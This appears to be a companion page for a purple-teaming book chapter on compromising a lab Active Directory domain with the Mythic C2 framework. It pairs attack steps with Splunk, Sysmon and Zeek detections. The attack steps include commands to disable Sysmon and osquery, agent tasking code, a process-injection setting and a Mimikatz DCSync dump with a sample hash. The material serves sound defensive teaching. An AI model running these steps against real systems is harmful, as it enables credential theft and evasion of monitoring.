---
layout: default
title: Domain Compromise with Mythic
tags: []
header_type       : "hero"
include_on_search : true
show_tags         : true
---

<div class="bs-component">
    <div class="progress">
        <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" aria-valuemin="0" aria-valuemax="100" style="width: 83.3%; background-color:#eb34e1"></div>
    </div>
</div>

## Introduction

In the final emulation chapter, we achieve domain compromise of the Attack Range Active Directory environment through token theft and a DCSync attack. We familiarize with the last of our open-source offensive tools here, Mythic.

<hr>

## Chapter Content

This section provides reproductions of the key figures and code snippets seen in this chapter.

#### The Mythic Command-and-Control Framework

##### Deploying Mythic

Commands to disable Sysmon and osquery from producing unwanted telemetry, as performed in the [previous chapter](/part-II/ad-recon-with-mitre-caldera).

```sh
ubuntu@ar-linux:~$ sudo systemctl stop sysmon
ubuntu@ar-linux:~$ sudo systemctl disable sysmon
ubuntu@ar-linux:~$ sudo systemctl stop osqueryd
ubuntu@ar-linux:~$ sudo systemctl disable osqueryd
```

Commands to clone Mythic into the Linux host's `/opt` directory.

```sh
ubuntu@ar-linux:~$ cd /opt/
ubuntu@ar-linux:/opt$ sudo git clone https://github.com/aguidetopurpleteaming/Mythic.git
```

Commands to create the `mythic-cli` binary that enables control of Mythic and the installation of its agents and C2 profiles.

```sh
ubuntu@ar-linux:/opt/Mythic$ sudo apt install make -y
ubuntu@ar-linux:/opt/Mythic$ sudo make
```

A command to start Mythic with the `mythic-cli` binary.

```sh
ubuntu@ar-linux:/opt/Mythic$ sudo ./mythic-cli start
```

##### Installing Command-and-Control Profiles

Commands to install HTTP and peer-to-peer SMB profiles from the pinned AGPT repositories, using the `mythic-cli`.

```sh
ubuntu@ar-linux:/opt/Mythic$ sudo ./mythic-cli install github https://github.com/aguidetopurpleteaming/http
ubuntu@ar-linux:/opt/Mythic$ sudo ./mythic-cli install github https://github.com/aguidetopurpleteaming/smb
```

##### Deploying Agents

A command to install the Apollo agent, via the `mythic-cli`.

```sh
ubuntu@ar-linux:/opt/Mythic$ sudo ./mythic-cli install github https://github.com/aguidetopurpleteaming/Apollo
```

##### Reporting

<div class="bs-component">
    <div class="alert alert-warning">
        You can download <code>MythicATTiRe</code> from: <a target="_blank" href="https://github.com/aguidetopurpleteaming/MythicATTiRe">https://github.com/aguidetopurpleteaming/MythicATTiRe</a>
    </div>
</div>

##### Scripting

<div class="bs-component">
    <div class="alert alert-warning">
        You can download the complete Jupyter notebook from: <a target="_blank" href="https://aguidetopurpleteaming.com/resources/10/AGPT-CP10-Mythic-Whoami-Task-Example.ipynb">https://aguidetopurpleteaming.com/resources/10/AGPT-CP10-Mythic-Whoami-Task-Example.ipynb</a>
    </div>
</div>

The full Jupyter notebook script content.

```python
# %% [markdown]
# # Mythic API Testing

# %%
!pip install pandas mythic
from mythic import mythic
import pandas as pd

# %%
mythic_instance = await mythic.login(
    username="mythic_admin",
    password="mythic_password",
    server_ip="10.0.1.21",
    server_port=8443,
    timeout=-1
)
if mythic_instance: print(f"[+] Connected to Mythic!")

target_host = "AR-WIN-2"
target_agent = "apollo"
target_domain = "ATTACKRANGE"

command_name = "shell"
command_parameters = "whoami"

# %% [markdown]
# ## Listing Agents

# %%
callbacks = await mythic.get_all_active_callbacks(mythic=mythic_instance)
attack_range_agents = [c for c in callbacks if c['domain'].upper() == target_domain.upper()]
print(f"[+] Found {len(attack_range_agents)} {target_domain} agents")
pd.DataFrame(callbacks)

# %%
hosts = [c for c in attack_range_agents \
    if c['host'].upper() == target_host.upper() and \
    c['payload']['payloadtype']['name']== target_agent
]
if not hosts:
    raise Exception(f"[-] Could not find {target_host} agent")

agent_id = hosts[0]['display_id']
print(f"[+] Found {{target_host}} agent with Callback Display ID: {agent_id}")

# %% [markdown]
# ## Executing a Command

# %%
output = await mythic.issue_task_and_waitfor_task_output(
    mythic=mythic_instance,
    command_name=command_name,
    parameters=command_parameters,
    callback_display_id=agent_id,
    timeout=60,
)
print(f"[+] Command output:\n{output.decode()}")
```

#### Simulating Domain Compromise

##### Uploading Implants to the ADMIN$ Share


<figure>
<img src="/assets/images/10/ad-comp-1.png" style="width: 100%" title="Figure 10-4"/>
<figcaption>Figure 10-4: Permitted and blocked communication paths between Mythic and the <code>ATTACKRANGE.LOCAL</code> hosts</figcaption>
</figure>

##### Conducting DCSync Attacks

An Apollo command to set the process injection method used by the agent.

```yaml
set_injection_technique CreateRemoteThread.CreateRemoteThread
```

The formatted command-line for conducting a DCSync attack via an Apollo agent, and the resulting output.

```
mimikatz -Command \"lsadump::dcsync /all\"

  .#####.   mimikatz 2.X (x64) #XXXXX
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /all
[DC] 'attackrange.local' will be the domain
[DC] 'ar-win-dc.attackrange.local' will be the DC server
[DC] Exporting domain 'attackrange.local'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
--snip--
** SAM ACCOUNT **

SAM Username         : krbtgt
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-971293030-2314070895-2582855049-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 27e8aa551692415a1219ba771a0f4fb0
--snip--
```

#### Defending Against the Attack

##### ADMIN$ Share Interactions

The snippet of Sysmon configuration XML that enables the logging of executable file creation.

```xml
<RuleGroup name="" groupRelation="or">
  <FileCreate onmatch="include">
    <TargetFilename name="T1023" condition="contains">\Start Menu</TargetFilename>
    --snip--
    <TargetFilename name="T1165" condition="contains">\Startup\</TargetFilename> 
    <TargetFilename name="DLL" condition="end with">.dll</TargetFilename>
    <TargetFilename name="EXE" condition="end with">.exe</TargetFilename>
    --snip--
  </FileCreate>
</RuleGroup>
```

Splunk SPL that queries Sysmon logs for file writes to the ADMIN$ share.

```perl
index=win 
EventID=11
RuleName="EXE"
TargetFilename="C:\\Windows\\*"
Image=System
```

An example log entry from Zeek that highlights the creation of the `agpt-smb.exe` file in the ADMIN$ share.

```json
{
    "ts": "XXXX-XX-XXT08:50:32.116466Z",
    "uid": "CI3YEm1w0eN3vm7Nma",
    "id.orig_h": "10.0.1.15",
    "id.orig_p": 49848,
    "id.resp_h": "10.0.1.14",
    "id.resp_p": 445,
    "action": "SMB::FILE_OPEN",
    "path": "\\\\AR-WIN-DC.ATTACKRANGE.LOCAL\\ADMIN$",
    "name": "agpt-smb.exe",
    "size": 0,
    "times.modified": "XXXX-XX-XXT08:50:32.236097Z",
    "times.accessed": "XXXX-XX-XXT08:50:32.236097Z",
    "times.created": "XXXX-XX-XXT08:50:32.236097Z",
    "times.changed": "XXXX-XX-XXT08:50:32.236097Z"
}
```

Another Splunk query for Zeek data that identifies the creation of executable formats like .DLL and .BAT in an ADMIN$ share.

```perl
index=zeek 
action=SMB::FILE_OPEN
path=*\\ADMIN$
name IN ("*.exe", "*.dll", "*.ps1","*.bat")
```


##### WmiPrvSE.exe Child Processes

<figure>
<img src="/assets/images/10/detect-0.png" style="width: 75%" title="WmiPrvSE.exe child processes"/>
<figcaption>The parent and child relationship for the Apollo binary spawned via WMI</figcaption>
</figure>

The parent process of commands launched via WMI on a remote host.

```powershell
WmiPrvSE.exe -secured -Embedding
```

A Splunk query for identifying all processes spawned from the `WmiPrvSE.exe` process.

```perl
index="win" 
EventID=1 
ParentCommandLine="C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding"
```

##### Splunk Lookup Files

The contents of the CSV lookup file containing domain controller host details.

```csv
Computer,IPAddress
ar-win-dc.attackrange.local,10.0.1.14
```

A Splunk query that makes use of the lookup file to detect WMI lateral movement targeting a domain controller.

```perl
index="win" 
EventID=1 
ParentCommandLine="C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding"
[ | inputlookup attackrange_dcs.csv | fields Computer ]
```

The equivalent query with the `inputlookup` subsearch expanded.

```perl
index="win" 
EventID=1 
ParentCommandLine="C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding"
Computer="ar-win-dc.attackrange.local"
```

##### Directory Replication Services Traffic

A Splunk query that identifies `DRSGetNCChanges` RPC operations that don't originate from the Attack Range domain controller.

```perl
index=zeek
sourcetype="bro:dce_rpc:json"
operation="DRSGetNCChanges"
id.orig_h!="10.0.1.14"
```

The same query adapted to use the domain controller lookup file.

```perl
index=zeek 
sourcetype="bro:dce_rpc:json" 
operation="DRSGetNCChanges" 
NOT [ | inputlookup attackrange_dcs.csv | rename IPAddress AS id.orig_h | fields id.orig_h ]
```


<hr>

## Resources

The following resources expand on topics covered in this chapter.
<br/>
<br/>


#### The Mythic Command-and-Control Framework
<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Mythic’s rebranding from the original name, Apfell</h6>
                <p><i>Cody Thomas, "A Change of Mythic Proportions," Aug 13, 2020</i></p>
                <a target="_blank" href="https://posts.specterops.io/a-change-of-mythic-proportions-21debeb03617" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Mythic’s Webshell agent, Arachne</h6>
                <p><i>Cody Thomas, "Spinning Webs — Unveiling Arachne for Web Shell C2," Feb 7, 2024</i></p>
                <a target="_blank" href="https://posts.specterops.io/spinning-webs-unveiling-arachne-for-web-shell-c2-26c40f570ea1" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>This site provides a general overview of the features supported by publicly available Mythic agents</h6>
                <p><i>"Mythic Community Agent Feature Matrix," accessed November 9, 2024</i></p>
                <a target="_blank" href="https://mythicmeta.github.io/overview/agent_matrix.html" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Slides from Calum Hall and Luke Roberts’s talk at BlackHat USA 2021 covering the abuse potential of macOS remote management features</h6>
                <p><i>Calum Hall, Luke Roberts, "Come to the Dark Side, We Have Apples: Turning macOS Management Evil," accessed July 1, 2024</i></p>
                <a target="_blank" href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Come-To-The-Dark-Side-We-Have-Apples-Turning-MacOS-Management-Evil.pdf" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>The Mythic Python library that can be used for scripting and other framework automation, installed via <code>pip</code></h6>
                <p><i>"Mythic Scripting," accessed November 1, 2024</i></p>
                <a target="_blank" href="https://github.com/MythicMeta/Mythic_Scripting" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>The completed Jupyter notebook developed in this chapter</h6>
                <p><i>"AGPT-CP10-Mythic-Whoami-Task-Example.ipynb," June 22, 2024</i></p>
                <a target="_blank" href="https://aguidetopurpleteaming.com/resources/10/AGPT-CP10-Mythic-Whoami-Task-Example.ipynb" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
</div>

#### Simulating Domain Compromise
<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Details of Microsoft's best practice for hardening Active Directory domain controllers, including restricting internet access</h6>
                <p><i>"Securing Domain Controllers Against Attack," May 30, 2024</i></p>
                <a target="_blank" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/securing-domain-controllers-against-attack" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Details of Mimikatz's DCSync attack including command-line arguments</h6>
                <p><i>Sean Metcalf, "Mimikatz DCSync Usage, Exploitation, and Detection,” September 25, 2015</i></p>
                <a target="_blank" href="https://adsecurity.org/?p=1729" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
</div>

#### Defending Against the Attack
<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Details of Mimikatz's DCSync attack including command-line arguments</h6>
                <p><i>Sean Metcalf, "Mimikatz DCSync Usage, Exploitation, and Detection,” September 25, 2015</i></p>
                <a target="_blank" href="https://adsecurity.org/?p=1729" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>A deep-dive into the default named and anonymous pipes used in Cobalt Strike post-exploitation and effective strategies to detect these</h6>
                <p><i>Riccardo Ancarani, "Detecting Cobalt Strike Default Modules via Named Pipe Analysis,” November 20, 2020</i></p>
                <a target="_blank" href="https://labs.withsecure.com/publications/detecting-cobalt-strike-default-modules-via-named-pipe-analysis" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Details of Cobalt Strike's malleability to evade detections for default named pipes, produced in response to Riccardo's previously referenced post</h6>
                <p><i>Raphael Mudge, "Learn Pipe Fitting for all of your Offense Projects,” February 9, 2021</i></p>
                <a target="_blank" href="https://www.cobaltstrike.com/blog/learn-pipe-fitting-for-all-of-your-offense-projects" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
</div>


<div class="container">
  <div class="row">
    <div class="col" style="text-align: left">
      <a href="/part-II/ad-recon-with-mitre-caldera/" class="btn btn-primary"><< Chapter 9</a>
    </div>
    <div class="col" style="text-align: right">
      <a href="/part-III/reporting-and-tracking/" class="btn btn-primary">Chapter 11 >></a>
    </div>
  </div>
</div>